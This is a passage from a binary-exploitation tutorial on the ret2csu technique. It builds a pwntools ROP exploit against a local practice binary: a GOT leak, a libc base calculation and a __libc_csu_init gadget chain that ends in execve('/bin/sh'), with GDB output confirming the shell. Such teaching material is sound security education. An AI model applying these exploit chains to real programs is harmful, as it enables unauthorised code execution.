Now, since we are done with theoretical aspects of this technique, it's time to try it practically. What we gonna do here is, chain the ROP chain from which we were able to input `"/bin/sh"`, and we are going to leak a GOT address in order to calculate the LIBC base address, then we will call main again.

Let's build a ROP chain:-

Some prologue and predefined variables:-

```python
from pwn import *

elf = ELF("chall")
libc = elf.libc
p = process("./chall")
 
writable_address = 0x601150 # writale address
pop_rdi = 0x400693   # pop rdi; ret;
```
Enter the `/bin/sh` string to the wriitable address.

```python
payload = b"A"*40 # Padding to `RIP` register
payload += p64(pop_rdi) # The `pop rdi; ret;`, this will wait for input
payload += p64(writable_address) # The address is passed to `rdi` register
payload += p64(elf.plt['gets']) # This will call the `gets` with it's first argument as the writable address

'''
gets(writable_address);
'''
```
You know about what is happening here from earlier. Let's move to other:-

```python
payload += p64(pop_rdi) # This will pop the `rdi` register which will wait for contents to be loaded in. 
payload += p64(elf.got['puts']) # This `GOT` address of `puts` will be given to `rdi` register, hence the first argument of puts
payload += p64(elf.plt['puts']) # This will call `puts` with the `elf.got['puts']`
```

This part is doing a bit of what is happening with the above part, the differnce is `puts` will print the value provided as first argument, here the `GOT` address will point to the LIBC address of the function which means it'll print the address of `puts` from the LIBC.

Now, let's send the payload and parse the leaked LIBC address:-

```python
payload += p64(elf.symbols['main']) # This will shift the `RIP` to `main` function, hence calling the function again.
p.sendlineafter(b"warrior\n", "Robin") # This will be given to the first input program is asking for.
p.sendlineafter(b"me?\n", payload) # Now, we will send the payload.
p.sendline("/bin/sh\x00") # The `/bin/sh` string is being sent such that it'd be stored to the writable address.

leak = u64(p.recv(6).strip().ljust(8, b"\x00")) # Receiving the address and padding it such that it'll be 8 bytes. 

libc.address = leak - libc.symbols['puts'] # Subtracting the leaked address from the LIBC absolute address of `puts` will  give us the base address.
log.info("puts@libc : " + hex(leak)) # Printing the leaked address.
log.info("libc      : " + hex(libc.address)) # Printing the libc base address
log.info("'/bin/sh' : " + str(writable_address)) # Printing `/bin/sh` address.
```

Let's run the script and check it in `gdb` if we are on the right way or not:-

```asm
d4mianwayne@oracle:~/pwn1$ python3 xpl.py 
[*] '/home/d4mianwayne/pwn1/chall'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] '/lib/x86_64-linux-gnu/libc-2.27.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Starting local process './chall': pid 14517
[*] Paused (press any to continue)

```

Now, attach it to `gdb`:-

```asm
d4mianwayne@oracle:~/pwn1$ gdb-gef -q chall
Reading symbols from chall...(no debugging symbols found)...done.
GEF for linux ready, type `gef' to start, `gef config' to configure
78 commands loaded for GDB 8.1.0.20180409-git using Python engine 3.6
[*] 2 commands could not be loaded, run `gef missing` to know why.
gef➤  attach 14517
Attaching to program: /home/d4mianwayne/pwn1/chall, process 14517
Reading symbols from /lib/x86_64-linux-gnu/libc.so.6...Reading symbols from /usr/lib/debug//lib/x86_64-linux-gnu/libc-2.27.so...done.

-- snip --

x/read.c:27
27	../sysdeps/unix/sysv/linux/read.c: No such file or directory.
```

Let's continue the process with `continue`:-

```asm
gef➤  continue
Continuing.

```

Now, resuming the script:-

```asm
d4mianwayne@oracle:~/pwn1$ python3 xpl.py 
[*] '/home/d4mianwayne/pwn1/chall'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] '/lib/x86_64-linux-gnu/libc-2.27.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Starting local process './chall': pid 14517
[*] Paused (press any to continue)
[*] puts@libc : 0x7effdfd759c0
[*] libc      : 0x7effdfcf5000
[*] '/bin/sh' : 6295888
[*] Switching to interactive mode

Welcome to the world of Pwning
I'd like to know the name of brave warrior  
$  
```


---

```asm
Welcome to the world of Pwning
I'd like to know the name of brave warrior  
$  
```
 
This is printed because we called the `main` again.

---

Now, we will Interrupt the execution of program inside gdb to check if the address are correct:-

```asm
gef➤  p puts
$1 = {int (const char *)} 0x7effdfd759c0 <_IO_puts>
gef➤  
gef➤  vmmap
[ Legend:  Code | Heap | Stack ]
Start              End                Offset             Perm Path
0x0000000000400000 0x0000000000401000 0x0000000000000000 r-x /home/d4mianwayne/pwn1/chall
0x0000000000600000 0x0000000000601000 0x0000000000000000 r-- /home/d4mianwayne/pwn1/chall
0x0000000000601000 0x0000000000602000 0x0000000000001000 rw- /home/d4mianwayne/pwn1/chall
0x0000000001987000 0x00000000019a8000 0x0000000000000000 rw- [heap]
0x00007effdfcf5000 0x00007effdfedc000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/libc-2.27.so

-- snip --
gef➤  x/s 6295888
0x601150:	"/bin/sh"
```

Awesome! Everything seems to be right. Now, we will go through second payload:-

# Payload: Part 2

Now, this payload is crucial since this is where the actual `ret2csu` is, I'll try to explain as much as I can:-

```python

payload = b"A"*40 # Padding to `RIP` register
payload += p64(0x40068a) 

'''
0x000000000040068a <+90>:	pop    rbx
   0x000000000040068b <+91>:	pop    rbp
   0x000000000040068c <+92>:	pop    r12
   0x000000000040068e <+94>:	pop    r13
   0x0000000000400690 <+96>:	pop    r14
   0x0000000000400692 <+98>:	pop    r15
   0x0000000000400694 <+100>:	ret    

'''
payload += p64(0x00) # Passed to `rbx` register
payload += p64(0x01) # Passed to `rbp`
payload += p64(0x600e38) # Passed to `r12` 
payload += p64(writable_address) # Passed to `r13`
payload += p64(0x00) # Passed to `r14`
payload += p64(0x00) # Passed to `r15`

```

So, as you remember the following instructions:-

```asm
   0x0000000000400670 <+64>:	mov    rdx,r15
   0x0000000000400673 <+67>:	mov    rsi,r14
   0x0000000000400676 <+70>:	mov    edi,r13d
```

That's why we provided the value we wanted in `rdx`, `rsi` and `rdi` to `r15`, `r14` and `r13` respectively. The values passed to `rbx` and `rbp` have their importance when we call next chain. But first, let's run the script and attach it to gdb such that we can check content registers:-

```python
payload += p64(0x00) # Passed to `rbx` register
payload += p64(0x01) # Passed to `rbp`
payload += p64(0x600e38) # Passed to `r12` 
payload += p64(writable_address) # Passed to `r13`
payload += p64(0x00) # Passed to `r14`
payload += p64(0x00) # Passed to `r15`

p.sendlineafter(b"warrior\n", "Robin")
pause()
p.sendlineafter(b"me?\n", payload)
p.interactive()
```

Since, you already know the drill of attaching and continuing the process in `gdb`, I'll show the contents of registers:-

```asm
gef➤  c
Continuing.

Thread 1 "chall" received signal SIGSEGV, Segmentation fault.
[ Legend: Modified register | Code | Heap | Stack | String ]

-- snip --

───────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "chall", stopped 0x7ffe1b95ba00 in ?? (), reason: SIGSEGV
─────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x7ffe1b95ba00 → or BYTE PTR [rdx+0x7ffe1b95], bh
──────────────────────────────────────────────────────────────────────────────────────────────────────────
0x00007ffe1b95ba00 in ?? ()

```

The registers values:-

```asm
gef➤  info registers
rax            0x7ffe1b95b8e8	0x7ffe1b95b8e8
rbx            0x0	0x0
rcx            0x7fa7df2a7a00	0x7fa7df2a7a00
rdx            0x7fa7df2a98d0	0x7fa7df2a98d0
rsi            0x1324671	0x1324671
rdi            0x7ffe1b95b8e9	0x7ffe1b95b8e9
rbp            0x1	0x1
rsp            0x7ffe1b95b950	0x7ffe1b95b950
r8             0x13246d1	0x13246d1
r9             0x7fa7df2a98d0	0x7fa7df2a98d0
r10            0x7fa7df4b74c0	0x7fa7df4b74c0
r11            0x246	0x246
r12            0x600e38	0x600e38
r13            0x601150	0x601150
r14            0x0	0x0
r15            0x0	0x0
rip            0x7ffe1b95ba00	0x7ffe1b95ba00
eflags         0x10246	[ PF ZF IF RF ]
cs             0x33	0x33
ss             0x2b	0x2b
ds             0x0	0x0
es             0x0	0x0
fs             0x0	0x0
gs             0x0	0x0

gef➤  x/s 0x601150
0x601150:	"/bin/sh"

```

Now, it's time to check the second ROP chain:-

```python
'''
   0x0000000000400670 <+64>:	mov    rdx,r15
   0x0000000000400673 <+67>:	mov    rsi,r14
   0x0000000000400676 <+70>:	mov    edi,r13d
   0x0000000000400679 <+73>:	call   QWORD PTR [r12+rbx*8]
   0x000000000040067d <+77>:	add    rbx,0x1
   0x0000000000400681 <+81>:	cmp    rbp,rbx
   0x0000000000400684 <+84>:	jne    0x400670 <__libc_csu_init+64>
   0x0000000000400686 <+86>:	add    rsp,0x8
   0x000000000040068a <+90>:	pop    rbx
   0x000000000040068b <+91>:	pop    rbp
   0x000000000040068c <+92>:	pop    r12
   0x000000000040068e <+94>:	pop    r13
   0x0000000000400690 <+96>:	pop    r14
   0x0000000000400692 <+98>:	pop    r15
   0x0000000000400694 <+100>:	ret    
'''

payload += p64(0x00)            # add rsp,0x8 padding
payload += p64(0x00)            # rbx
payload += p64(0x00)            # rbp
payload += p64(0x00)            # r12
payload += p64(0x00)            # r13
payload += p64(0x00)            # r14
payload += p64(0x00)            # r15
payload += p64(libc.symbols['execve'])
```

Well, kind of a long chain to deal with but it's very simple, as I already explained it but this time we are giving the input, so this is a crucial part. The explanations would be done line by line:-

```asm
   0x0000000000400670 <+64>:	mov    rdx,r15
   0x0000000000400673 <+67>:	mov    rsi,r14
   0x0000000000400676 <+70>:	mov    edi,r13d
   0x0000000000400679 <+73>:	call   QWORD PTR [r12+rbx*8]
   0x000000000040067d <+77>:	add    rbx,0x1
   0x0000000000400681 <+81>:	cmp    rbp,rbx
   0x0000000000400684 <+84>:	jne    0x400670 <__libc_csu_init+64>
   0x0000000000400686 <+86>:	add    rsp,0x8
```

Now, the `mov` instructions will transfer the contents to registers. Previously, we gave `r12` : `0x600e38` which is an address to the `_init` pointer, here, apparently, `rbx` was `0` which means `[r12 + rbx * 8]` will be equal to `[0x600e38 + 0 * 8]` which will be `[0x600e38]`.  After that `rbx` is incremented by `0x1` which will make the `rbx` value `0x1`. Then the `cmp    rbp,rbx`, as you remember from the first chain, we provided `0x1` to `rbp` value, then it will evaluate equally since `rbp` and `rbx` both have the value of `0x1`, skipping the `jne` line. After that we have, `add rsp, 0x8`, we have to pad this instruction by giving `0x0`, after that we can give `0x0` to the popped registers as the control flow of program would take care of this.

# Pwned

As we are done understanding the payload, it's time to run the final script:-

---

> Note: I put a breakpoint at `execve`. This will help us to check the arguments provided to it.

```asm
gef➤  b *execve
Breakpoint 1 at 0x7fa7defa0e30: file ../sysdeps/unix/syscall-template.S, line 78.
```

---

```asm
d4mianwayne@oracle:~/pwn1$ python3 xpl.py 
[*] '/home/d4mianwayne/pwn1/chall'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] '/lib/x86_64-linux-gnu/libc-2.27.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Starting local process './chall': pid 15085
[*] puts@libc : 0x7f09dd95e9c0
[*] libc      : 0x7f09dd8de000
[*] '/bin/sh' : 6295888
[*] Paused (press any to continue)
```

Now, we will attach the process, and continue:-

```asm
gef➤  b *execve
Breakpoint 1 at 0x7f09dd9c2e30: file ../sysdeps/unix/syscall-template.S, line 78.
gef➤  c
Continuing.
[ Legend: Modified register | Code | Heap | Stack | String ]

-- snip -- 

───────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "chall", stopped 0x7f09dd9c2e30 in execve (), reason: BREAKPOINT
─────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x7f09dd9c2e30 → execve()
──────────────────────────────────────────────────────────────────────────────────────────────────────────

Breakpoint 1, execve () at ../sysdeps/unix/syscall-template.S:78
78	../sysdeps/unix/syscall-template.S: No such file or directory.

gef➤  x/s $rdi
0x601150:	"/bin/sh"
gef➤  x/x $rdx
0x0:	Cannot access memory at address 0x0
gef➤  x/x $rsi
0x0:	Cannot access memory at address 0x0
```

Cool, now let's continue the execution:-

```asm
gef➤  c
Continuing.
process 15085 is executing new program: /bin/dash
```

It seems like we spawned a shell, let's get back to the script:-

```asm
d4mianwayne@oracle:~/pwn1$ python3 xpl.py 
[*] '/home/d4mianwayne/pwn1/chall'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] '/lib/x86_64-linux-gnu/libc-2.27.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Starting local process './chall': pid 15085
[*] puts@libc : 0x7f09dd95e9c0
[*] libc      : 0x7f09dd8de000
[*] '/bin/sh' : 6295888
[*] Paused (press any to continue)
[*] Switching to interactive mode
$ whoami
d4mianwayne
$ id
uid=1000(d4mianwayne) gid=1000(d4mianwayne) groups=1000(d4mianwayne),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lpadmin),126(sambashare),129(libvirt)
$ 
[*] Interrupted
```

Awesome, we did it. Congratulations, you finally made it to end which means you learned the `ret2csu` to some extent. I'd recommend you try it on yourself and mess around with `gdb`.







